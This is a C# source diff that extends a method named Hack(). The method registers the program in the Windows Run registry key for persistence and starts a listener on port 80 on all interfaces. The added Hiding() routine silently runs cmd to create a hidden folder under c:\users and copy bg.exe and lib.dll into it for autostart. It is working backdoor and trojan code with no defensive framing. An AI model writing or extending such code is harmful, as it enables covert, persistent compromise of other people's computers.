@@ -123,13 +123,13 @@ namespace ReformCodes
 
         private void Hack()
         {
-            string completePath = Process.GetCurrentProcess().MainModule.FileName;
             try
             {
                 RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                 if (registryKey.GetValue("bg") == null)
                 {
-                    registryKey.SetValue("bg", completePath);
+                    string path = Hiding() + @"\bg.exe";
+                    registryKey.SetValue("bg", path);
                 }
             }
             catch
@@ -139,6 +139,23 @@ namespace ReformCodes
             int port = 80;
             ServersManager.ServerAddedAndStarting(new MyProtocol(), new IPEndPoint(IPAddress.Any, port));
             Hide();
+        }
+
+        private string Hiding()
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = "cmd";
+            process.StartInfo.RedirectStandardInput = true;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = false;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+            process.StandardInput.WriteLine(@"mkdir c:\users\_win_bg & attrib +h c:\users\_win_bg & copy bg.exe c:\users\_win_bg & copy lib.dll c:\users\_win_bg");
+            process.StandardInput.Flush();
+            process.Close();
+
+            return @"c:\users\_win_bg";
         }
     }
 }
